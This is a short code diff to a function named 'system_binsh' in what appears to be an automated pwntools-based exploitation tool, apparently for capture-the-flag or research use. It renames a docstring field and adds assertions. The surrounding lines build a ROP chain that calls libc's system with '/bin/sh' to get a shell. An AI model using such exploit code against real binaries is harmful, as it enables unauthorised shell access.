@@ -12,7 +12,7 @@ def system_binsh(state: PwnState) -> PwnState:
         state: The current ``PwnState`` with the following set
 
             - ``target``: What we want to exploit.
-            - ``elf``: pwntools ``ELF`` of ``state.binary_name``.
+            - ``_elf``: pwntools ``ELF`` of ``state.binary_name``.
             - ``libc``: Path to ``target``'s libc.
             - ``libc_base``: Base address of ``libc``.
             - ``vuln_function``: Name of vulnerable function in binary,
@@ -22,6 +22,9 @@ def system_binsh(state: PwnState) -> PwnState:
     Returns:
         The given ``PwnState``.
     """
+    assert state.target is not None
+    assert state._elf is not None
+
     libc = arutil.load_libc(state)
     rop = ROP([state._elf, libc])
     arutil.align_call(rop, "system", [next(libc.search(b"/bin/sh\x00"))])
